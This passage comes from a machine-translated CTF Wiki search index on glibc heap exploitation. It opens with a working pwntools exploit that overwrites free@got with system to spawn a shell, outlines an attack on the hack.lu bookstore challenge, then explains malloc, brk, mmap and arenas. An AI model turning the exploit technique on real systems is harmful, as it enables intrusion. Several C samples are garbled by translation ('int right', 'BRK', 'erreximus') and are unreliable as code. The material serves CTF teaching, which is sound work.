r.sendline(content)\n\n\n\n\n\ndef edit(idx, content):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"2\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(idx))\n\n    r.recvuntil(\":\")\n\n    r.sendline(content)\n\n\n\n\n\ndef show(idx):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"3\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(idx))\n\n\n\n\n\ndef delete(idx):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"4\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(idx))\n\n\n\n\n\nfree_got = 0x602018\n\ncreate(0x18, \"dada\")  # 0\n\ncreate (0x10, &amp;quot;daa&amp;quot;) # 1\n# overwrite heap 1's struct's size to 0x41\n\nedit(0, \"/bin/sh\\x00\" + \"a\" * 0x10 + \"\\x41\")\n\n# trigger heap 1's struct to fastbin 0x40\n\n# heap 1's content to fastbin 0x20\n\ndelete(1)\n\n# new heap 1's struct will point to old heap 1's content, size 0x20\n\n# new heap 1's content will point to old heap 1's struct, size 0x30\n\n# that is to say we can overwrite new heap 1's struct\n\n# here we overwrite its heap content pointer to free@got\n\ncreate(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1\n\n# leak freeaddr\n\nshow(1)\n\nr.recvuntil(\"Content : \")\n\ndata = r.recvuntil(\"Done !\")\n\n\n\nfree_addr = u64(data.split(\"\\n\")[0].ljust(8, \"\\x00\"))\n\nlibc_base = free_addr - libc.symbols['free']\n\nlog.success('libc base addr: ' + hex(libc_base))\n\nsystem_addr = libc_base + libc.symbols['system']\n\n#gdb.attach(r)\n\n# overwrite free@got with system addr\nedit(1, p64(system_addr))\n\n# trigger system(\"/bin/sh\")\n\ndelete(0)\n\nr.interactive()\n</code></pre>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#2015-hacklu-bookstore","title":"2015 hacklu bookstore","text":"<p>[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore)</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-information_1","title":"Basic Information","text":"<pre><code>\u279c  2015_hacklu_bookstore git:(master) file books    \n\nbooks: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped\n\n\u279c  2015_hacklu_bookstore git:(master) checksec books    \n\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books'\n\n    Arch:     amd64-64-little\n\n    RELRO:    No RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n</code></pre> <p>It can be seen that the program is a dynamically linked 64-bit program, which mainly enables Canary and NX protection.</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-skills_1","title":"basic skills","text":"<p>The main function of the program is the book, as follows</p> <ul> <li>You can order up to two books.</li> <li>Choose to order the first few books according to the number, you can add the corresponding name for each book. However, a vulnerability of any length heap overflow occurred at the name added.</li> <li>Delete order according to the number, but here it is simply free, and is not set to NULL, so there will be a vulnerability after use after free.</li> <li>Submit an order to put the names of the two books together. Here, due to the above heap overflow problem, there will also be a heap overflow vulnerability.</li> <li>In addition, there is a Format String Vulnerability before the program exits.</li> </ul> <p>Although the vulnerability of the program is very strong here, the size of all the malloc is completely fixed, we can only use these allocated chunks to operate.</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#using-ideas","title":"Using ideas","text":"<p>The main vulnerabilities in the program are heap overflow and format string vulnerabilities, but if you want to exploit the format string vulnerability, you will need to overflow the corresponding dest array. The specific ideas are as follows</p> <ol> <li>Use chunk overflow to perform chunk extend, so that when <code>malloc(0x140uLL)</code> is in submit, it just returns the position of the second order. Before the submit, lay out the heap memory layout so that the string can be overlaid to just the specified format string.</li> <li>By constructing dest as the specified format string: on the one hand, the address of __libc_start_main_ret is leaked, ** on the one hand, the control program returns to execution . At this point, you can know the libc base address, system and other addresses. It should be noted that since the program will directly exit immediately after submit, our better idea is to modify the variables in fini_array so that after the program is executed, ** return to the position we expect. Here we will use a trick, the program will read 128 size each time it reads the selection, on the stack. When the program finally outputs dest, the part of the selection that was previously read must be on the stack, so if we pre-arrange some control flow pointers on the stack, we can control the execution flow of the program.</li> <li>Re-use the format string vulnerability and override free@got as the system address to achieve arbitrary command execution.</li> </ol> <p>Here, the offset of each parameter is</p> <ul> <li>Fini_array0: 5 + 8 = 13</li> <li>__libc_start_main_ret : 5+0x1a=31\u3002</li> </ul> <pre><code>00:0000\u2502 rsp  0x7ffe6a7f3ec8 \u2014\u25b8 0x400c93 \u25c2\u2014 mov    eax, 0\n\n01:0008\u2502      0x7ffe6a7f3ed0 \u25c2\u2014 0x100000000\n\n02:0010\u2502      0x7ffe6a7f3ed8 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:')\n\n03:0018\u2502      0x7ffe6a7f3ee0 \u2014\u25b8 0x400d38 \u25c2\u2014 pop    rcx\n\n04:0020\u2502      0x7ffe6a7f3ee8 \u2014\u25b8 0x9f2010 \u25c2\u2014 0x6666666666667325 ('%sffffff')\n\n05:0028\u2502      0x7ffe6a7f3ef0 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ('Order 1:')\n\n06: 0030\u2502 0x7ffe6a7f3ef8 -\u25b8 0x9f2130 \u25c2- 0x6564724f203a3220 (&amp;#39;2: Order&amp;#39;)\n07:0038\u2502      0x7ffe6a7f3f00 \u25c2\u2014 0xa35 /* '5\\n' */\n\n08:0040\u2502      0x7ffe6a7f3f08 \u25c2\u2014 0x0\n\n... \u2193\n\n0b:0058\u2502      0x7ffe6a7f3f20 \u25c2\u2014 0xff00000000000000\n\n0c:0060\u2502      0x7ffe6a7f3f28 \u25c2\u2014 0x0\n\n... \u2193\n\n0f:0078\u2502      0x7ffe6a7f3f40 \u25c2\u2014 0x5f5f00656d697474 /* 'ttime' */\n\n10:0080\u2502      0x7ffe6a7f3f48 \u25c2\u2014 0x7465675f6f736476 ('vdso_get')\n\n11:0088\u2502      0x7ffe6a7f3f50 \u25c2\u2014 0x1\n\n12:0090\u2502      0x7ffe6a7f3f58 \u2014\u25b8 0x400cfd \u25c2\u2014 add    rbx, 1\n\n13: 0098\u2502 0x7ffe6a7f3f60 \u25c2- 0x0\n... \u2193\n\n15:00a8\u2502      0x7ffe6a7f3f70 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n\n16:00b0\u2502      0x7ffe6a7f3f78 \u2014\u25b8 0x400780 \u25c2\u2014 xor    ebp, ebp\n\n17:00b8\u2502      0x7ffe6a7f3f80 \u2014\u25b8 0x7ffe6a7f4070 \u25c2\u2014 0x1\n\n18: 00c0 0x 0x7ffe6a7f3f88 \u25c2- 0xd8d379f22453ff00\n19:00c8\u2502 rbp  0x7ffe6a7f3f90 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n\n1a:00d0\u2502      0x7ffe6a7f3f98 \u2014\u25b8 0x7f9db2113830 (__libc_start_main+240) \u25c2\u2014 mov    edi, eax\n</code></pre> <p>**! ! ! To be added! ! ! **</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#topic","title":"topic","text":"<ul> <li>2016 Nuit du Hack CTF Quals : night deamonic heap</li> </ul>"},{"location":"pwn/linux/glibc-heap/heap_overview/","title":"\u5806 overview","text":""},{"location":"pwn/linux/glibc-heap/heap_overview/#what-is-a-heap","title":"What is a heap?","text":"<p>The heap can provide dynamically allocated memory while the program is running, allowing the program to request memory of unknown size. The heap is actually a continuous linear region of the program virtual address space, which grows from a low address to a high address. We generally refer to the part of the program that manages the heap as the heap manager.</p> <p>The heap manager is in the middle of the user program and the kernel, mainly doing the following work.</p> <ol> <li>In response to the user's request for a memory request, request memory from the operating system and return it to the user program. At the same time, in order to maintain the efficiency of memory management, the kernel generally pre-allocates a large piece of contiguous memory, and then let the heap manager manage the memory through some algorithm. The heap manager will interact with the operating system again only if there is insufficient heap space.</li> <li>Manage the memory released by the user. In general, the memory released by the user is not directly returned to the operating system, but is managed by the heap manager. These released memory can respond to requests from the user for newly requested memory.</li> </ol> <p>Early heap allocation and reclamation in Linux was implemented by Doug Lea, but it shared the heap memory space of the process when it processed multiple threads in parallel. Therefore, for security, when a thread uses a heap, it locks. At the same time, however, locking can cause other threads to be unable to use the heap, reducing the efficiency of memory allocation and reclamation. At the same time, if it is not properly controlled when it is used by multiple threads, it may affect the correctness of memory allocation and recycling. Wolfram Gloger has been improved on top of Doug Lea to support multithreading. This heap allocator is ptmalloc. After glibc-2.3.x., ptmalloc2 is integrated in glibc.</p> <p>The heap allocator currently used in the Linux standard distribution is the heap allocator in glibc: ptmalloc2. Ptmalloc2 mainly allocates and frees memory blocks through the malloc/free function.</p> <p>It should be noted that in the process of memory allocation and use, Linux has such a basic memory management idea, ** only when a real address is accessed, the system will establish a mapping relationship between virtual pages and physical pages**. So although the operating system has allocated a large chunk of memory to the program, this memory is actually just virtual memory. Only when the user uses the corresponding memory will the system actually allocate the physical page to the user.</p>"},{"location":"pwn/linux/glibc-heap/heap_overview/#heap-basic-operations","title":"heap basic operations","text":"<p>Here we mainly introduce</p> <ul> <li>Basic heap operations, including heap allocation, reclamation, system calls behind heap allocation</li> <li>Introducing the current multithreading support for the heap.</li> </ul>"},{"location":"pwn/linux/glibc-heap/heap_overview/#malloc","title":"malloc","text":"<p>In glibc's [malloc.c] (https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448), the description of malloc is as follows</p> <pre><code>/*\n\n  malloc(size_t n)\n\n  Returns a pointer to a newly allocated chunk of at least n bytes, or null\n\n  if no space is available. Additionally, on failure, errno is\n\n  set to ENOMEM on ANSI C systems.\n\n  If n is zero, malloc returns a minumum-sized chunk. (The minimum\n\n  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit\n\n  systems.)  On most systems, size_t is an unsigned type, so calls\n\n  with negative arguments are interpreted as requests for huge amounts\n\n  of space, which will often fail. The maximum supported value of n\n\n  differs across systems, but is in all cases less than the maximum\n\n  representable value of a size_t.\n\n*/\n</code></pre> <p>As you can see, the malloc function returns a pointer to the memory block of the corresponding size byte. In addition, the function also handles some exceptions.</p> <ul> <li>When n=0, returns the smallest memory block of the heap allowed by the current system.</li> <li>When n is negative, since size_t is an unsigned number (which is very important) on most systems, the program will apply for a large amount of memory, but usually it will fail because the system Not so much memory can be allocated.</li> </ul>"},{"location":"pwn/linux/glibc-heap/heap_overview/#free","title":"free","text":"<p>In glibc's [malloc.c] (https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465), the description of free is as follows</p> <pre><code>/*\n\n      free(void* p)\n\n      Releases the chunk of memory pointed to by p, that had been previously\n\n      allocated using malloc or a related routine such as realloc.\n\n      It has no effect if p is null. It can have arbitrary (i.e., bad!)\n\n      effects if p has already been freed.\n\n      Unless disabled (using mallopt), freeing very large spaces will\n\n      when possible, automatically trigger operations that give\n\n      back unused memory to the system, thus reducing program footprint.\n\n    */\n</code></pre> <p>As you can see, the free function releases the memory block pointed to by p. This memory block may be obtained through the malloc function, or it may be obtained through the related function realloc.</p> <p>In addition, this function also handles exceptions.</p> <ul> <li>** When p is a null pointer, the function does nothing. **</li> <li>When p has been released, releasing it again will have a messy effect, which is actually <code>double free</code>.</li> <li>In addition to being disabled (mallopt), when a large amount of memory is freed, the program will return the memory to the system in order to reduce the memory space used by the program.</li> </ul>"},{"location":"pwn/linux/glibc-heap/heap_overview/#system-call-behind-memory-allocation","title":"System call behind memory allocation","text":"<p>In the functions mentioned above, whether it is malloc function or free function, we use it frequently when we apply and release memory dynamically, but they are not functions that really interact with the system. The system calls behind these functions are mainly (s)brk functions and mmap, munmap function.</p> <p>As shown in the following figure, we mainly consider the operation of applying for a memory block to the heap.</p> <p></p>"},{"location":"pwn/linux/glibc-heap/heap_overview/#s-brk","title":"(s) brk","text":"<p>For heap operations, the operating system provides brk functions, and the glibc library provides sbrk functions. We can request memory from the operating system by increasing the size of [brk] (https://en.wikipedia.org/wiki/Sbrk).</p> <p>Initially, the starting address of the heap [start_brk] (http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365) and the current end of the heap [brk] (http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365) Point to the same address. The exact location of the two will vary depending on whether ASLR is turned on.</p> <ul> <li>When ASLR protection is not enabled, start_brk and brk point to the end of the data/bss section.</li> <li>When ASLR protection is turned on, start_brk and brk also point to the same location, except that this location is at a random offset after the end of the data/bss section.</li> </ul> <p>The specific effect is as follows (this picture is basically the same as that spread on the Internet, here is because you have to draw a large picture, so you have drawn it separately)</p> <p></p> <p>example</p> <pre><code>/* sbrk and brk example */\n\n#include &lt;stdio.h&gt;\n\n#include &lt;unistd.h&gt;\n\n#include &lt;sys/types.h&gt;\n\n\n\nint main()\n\n{\n\n        void *curr_brk, *tmp_brk = NULL;\n\n\n\n        printf(\"Welcome to sbrk example:%d\\n\", getpid());\n\n\n\n        /* sbrk(0) gives current program break location */\n\ntmp_brk = curr_brk = sbrk (0);\n        printf(\"Program Break Location1:%p\\n\", curr_brk);\n\n        getchar();\n\n\n\n        /* brk(addr) increments/decrements program break location */\n\nbrk (+ curr_brk 4096);\n\n\ncurr_brk = sbrk (0);\n        printf(\"Program break Location2:%p\\n\", curr_brk);\n\n        getchar();\n\n\n\nBRK (tmp_brk);\n\ncurr_brk = sbrk (0);\n        printf(\"Program Break Location3:%p\\n\", curr_brk);\n\n        getchar();\n\n\n\n        return 0;\n\n}\n</code></pre> <p>It should be noted that the getchar() function is executed after each execution, which is for us to see the true mapping of the program.</p> <p>Before the first call to brk</p> <p>As you can see from the output below, there is no heap. therefore</p> <ul> <li>start_brk = brk = end_data = 0x804b000</li> </ul> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk\n\nWelcome to sbrk example:6141\n\nProgram Break Location1:0x804b000\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n\n...\n\n0804a000-0804b000 rw-p 00001000 08:01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\nb7e21000-b7e22000 rw-p 00000000 00:00 0\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n</code></pre> <p>After adding brk for the first time</p> <p>As you can see from the output below, the heap segment has appeared.</p> <ul> <li> <p>start_brk = end_data = 0x804b000</p> </li> <li> <p>brk = 0x804c000</p> </li> </ul> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk\n\nWelcome to sbrk example:6141\n\nProgram Break Location1:0x804b000\n\nProgram Break Location2:0x804c000\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n\n...\n\n0804a000-0804b000 rw-p 00001000 08:01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\n0804b000-0804c000 rw-p 00000000 00:00 0          [heap]\n\nb7e21000-b7e22000 rw-p 00000000 00:00 0\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n</code></pre> <p>Among them, the row about the heap</p> <ul> <li>0x0804b000 is the starting address of the corresponding heap</li> <li>rw-p indicates that the heap has read and write permissions and is private data.</li> <li>00000000 indicates a file offset, which is 0 because this part of the content is not mapped from the file.</li> <li>00:00 is the device number of the master/slave (Major/mirror). This part of the content is not mapped from the file, so it is also 0.</li> <li>0 indicates the Inode number. Since this part of the content is not mapped from the file, it is 0.</li> </ul>"},{"location":"pwn/linux/glibc-heap/heap_overview/#mmap","title":"mmap","text":"<p>Malloc will use [mmap] (http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285) to create a separate anonymous map segment. The purpose of anonymous mapping is mainly to apply for memory filled with 0, and this memory is only used by the calling process.</p> <p>example</p> <pre><code>/* Private anonymous mapping example using mmap syscall */\n\n#include &lt;stdio.h&gt;\n\n#include &lt;sys/mman.h&gt;\n\n#include &lt;sys/types.h&gt;\n\n#include &lt;sys/stat.h&gt;\n\n#include &lt;fcntl.h&gt;\n\n#include &lt;unistd.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n\n\nvoid static inline errExit(const char* msg)\n\n{\n\n        printf(\"%s failed. Exiting the process\\n\", msg);\n\n        exit(-1);\n\n}\n\n\n\nint main()\n\n{\n\nint right = -1;\n        printf(\"Welcome to private anonymous mapping example::PID:%d\\n\", getpid());\n\n        printf(\"Before mmap\\n\");\n\n        getchar();\n\n        char* addr = NULL;\n\n        addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n        if (addr == MAP_FAILED)\n\n                errExit(\"mmap\");\n\n        printf(\"After mmap\\n\");\n\n        getchar();\n\n\n\n        /* Unmap mapped region. */\n\n        ret = munmap(addr, (size_t)132*1024);\n\nif (right == -1)\nerreximus ( &amp;quot;munmap&amp;quot;);\n        printf(\"After munmap\\n\");\n\n        getchar();\n\n        return 0;\n\n}\n</code></pre> <p>Before executing mmap</p> <p>We can see from the output below that there is currently only the mmap segment of the .so file.</p> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps\n\n08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n\n0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p 00000000 00:00 0\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n</code></pre> <p>**mmap after **</p> <p>As can be seen from the output below, the memory we applied for is combined with the existing memory segment to form the mmap segment of b7e00000 to b7e21000.</p> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps\n\n08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n\n0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmapb7e00000-b7e22000 rw-p 00000000 00:00 0\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n</code></pre> <p>munmap</p> <p>From the output below, we can see that the memory segment we originally applied has disappeared, and the memory segment has returned to its original state.</p> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps\n\n08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n\n0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p 00000000 00:00 0\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n</code></pre>"},{"location":"pwn/linux/glibc-heap/heap_overview/#multi-threading-support","title":"Multi-threading support","text":"<p>In the original dlmalloc implementation, when two threads were simultaneously requesting memory, only one thread could enter the critical section to apply for memory, while another thread had to wait until there were no more threads in the critical section. This is because all threads share a heap. In gmbc's ptmalloc implementation, a better point is to support multi-threaded fast access. In the new implementation, all threads share multiple heaps.</p> <p>Here is an example.</p> <pre><code>/* Per thread arena example. */\n\n#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;pthread.h&gt;\n\n#include &lt;unistd.h&gt;\n\n#include &lt;sys/types.h&gt;\n\n\n\nvoid* threadFunc(void* arg) {\n\n        printf(\"Before malloc in thread 1\\n\");\n\n        getchar();\n\n        char* addr = (char*) malloc(1000);\n\n        printf(\"After malloc and before free in thread 1\\n\");\n\n        getchar();\n\n        free(addr);\n\n        printf(\"After free in thread 1\\n\");\n\n        getchar();\n\n}\n\n\n\nint main() {\n\n        pthread_t t1;\n\n        void* s;\n\nint right;\n        char* addr;\n\n\n\n        printf(\"Welcome to per thread arena example::%d\\n\",getpid());\n\n        printf(\"Before malloc in main thread\\n\");\n\n        getchar();\n\n        addr = (char*) malloc(1000);\n\n        printf(\"After malloc and before free in main thread\\n\");\n\n        getchar();\n\n        free(addr);\n\n        printf(\"After free in main thread\\n\");\n\n        getchar();\n\n        ret = pthread_create(&amp;t1, NULL, threadFunc, NULL);\n\nif (right)\n        {\n\n                printf(\"Thread creation error\\n\");\n\n                return -1;\n\n        }\n\n        ret = pthread_join(t1, &amp;s);\n\nif (right)\n        {\n\n                printf(\"Thread join error\\n\");\n\n                return -1;\n\n        }\n\n        return 0;\n\n}\n</code></pre> <p>Before the first application, there are no piles.</p> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread\n\nWelcome to per thread arena example::6501\n\nBefore malloc in main thread\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\nb7e05000-b7e07000 rw-p 00000000 00:00 0\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n</code></pre> <p>After the first application, as you can see from the output below, the heap segment is created and it is next to the data segment, which means that the malloc is implemented with the brk function. At the same time, it should be noted that although we only applied for 1000 bytes, we got a heap of 0x0806c000-0x0804b000=0x21000 bytes. **This means that although the program may only request a small amount of memory from the operating system, for convenience, the operating system allocates a large amount of memory to the program. In this case, the switching between the kernel state and the user state is avoided, and the efficiency of the program is improved. ** We call this contiguous memory area as arena. In addition, we call the memory requested by the main thread as main_arena. The memory of subsequent applications will always be obtained from this arena until there is not enough space. When there is not enough space in the arena, it can increase the heap space by adding brk. Similarly, arena can also shrink its space by reducing brk.</p> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread\n\nWelcome to per thread arena example::6501\n\nBefore malloc in main thread\n\nAfter malloc and before free in main thread\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p 00000000 00:00 0          [heap]\n\nb7e05000-b7e07000 rw-p 00000000 00:00 0\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n</code></pre> <p>** After the main thread releases the memory, we can see from the output below that the corresponding arena is not recycled, but is managed by glibc. When the later program requests memory again, glibc allocates the corresponding memory to the program according to the heap allocation algorithm when the memory managed by glibc is sufficient.</p> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread\n\nWelcome to per thread arena example::6501\n\nBefore malloc in main thread\n\nAfter malloc and before free in main thread\n\nAfter free in main thread\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p 00000000 00:00 0          [heap]\n\nb7e05000-b7e07000 rw-p 00000000 00:00 0\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n</code></pre> <p>Before the first thread malloc, we can see that there is no heap associated with thread 1, but there is a stack associated with thread 1.</p> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread\n\nWelcome to per thread arena example::6501\n\nBefore malloc in main thread\n\nAfter malloc and before free in main thread\n\nAfter free in main thread\n\nBefore malloc in thread 1\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p 00000000 00:00 0          [heap]\n\nb7604000-b7605000 ---p 00000000 00:00 0\n\nb7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n</code></pre> <p>The first thread after malloc, we can see from the output below that the heap segment of thread 1 was created. And its location is the memory mapped segment area, the same size is also 132KB (b7500000-b7521000). So this indicates that the corresponding function behind the thread is the mmap function. At the same time, we can see that the actual memory allocated to the program is 1M (b7500000-b7600000). Moreover, only 132KB of the part has readable and writable permissions, and this contiguous area becomes the thread arena.</p> <p>note:</p> <p>&gt; When the memory requested by the user is greater than 128KB, and no arena has enough space, then the system will execute the mmap function to allocate the corresponding memory space. This is independent of whether the request comes from the main thread or from the thread.</p> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread\n\nWelcome to per thread arena example::6501\n\nBefore malloc in main thread\n\nAfter malloc and before free in main thread\n\nAfter free in main thread\n\nBefore malloc in thread 1\n\nAfter malloc and before free in thread 1\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p 00000000 00:00 0          [heap]\n\nb7500000-b7521000 rw-p 00000000 00:00 0\nb7521000-b7600000 ---p 00000000 00:00 0\n\nb7604000-b7605000 ---p 00000000 00:00 0\n\nb7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n</code></pre> <p>** After the first thread releases the memory, we can see from the output below that releasing the memory will not re-send the memory to the system.</p> <pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread\n\nWelcome to per thread arena example::6501\n\nBefore malloc in main thread\n\nAfter malloc and before free in main thread\n\nAfter free in main thread\n\nBefore malloc in thread 1\n\nAfter malloc and before free in thread 1\n\nAfter free in thread 1\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps\n\n08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread\n\n0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread\n0804b000-0806c000 rw-p 00000000 00:00 0          [heap]\n\nb7500000-b7521000 rw-p 00000000 00:00 0\nb7521000-b7600000 ---p 00000000 00:00 0\n\nb7604000-b7605000 ---p 00000000 00:00 0\n\nb7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]\n\n...\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$\n</code></pre>"},{"location":"pwn/linux/glibc-heap/heap_overview/#references","title":"references","text":"<ul> <li>sploitfun</li> </ul>"},{"location":"pwn/linux/glibc-heap/heap_structure/","title":"\u5806related data structure","text":"<p>The operation of the heap is so complicated, so there must be a well-designed data structure inside glibc to manage it. The data structure corresponding to the heap is mainly divided into</p> <ul> <li>A macro structure that contains macro information about the heap through which the basic information of the heap can be indexed.</li> <li>Microstructure, which is used to specifically handle the allocation and reclaiming of memory blocks.</li> </ul>"},{"location":"pwn/linux/glibc-heap/heap_structure/#overview","title":"Overview\uff1f\uff1f\uff1f\uff1f","text":"<p>** Give a macro picture here. **</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#micro-structure","title":"micro structure","text":"<p>Here we first introduce the structure of the details in the heap, and the vulnerability of the heap is closely related to these structures**.</p>"},{"location":"pwn/linux/glibc-heap/heap_structure/#malloc_chunk","title":"malloc_chunk","text":""},{"location":"pwn/linux/glibc-heap/heap_structure/#overview_1","title":"Overview","text":"<p>During the execution of the program, we call the memory requested by malloc as chunk. This memory is represented inside the ptmalloc by the malloc_chunk structure. When the chunk requested by the program is free, it will be added to the corresponding idle management list.</p> <p>Very interestingly, ** they all use a 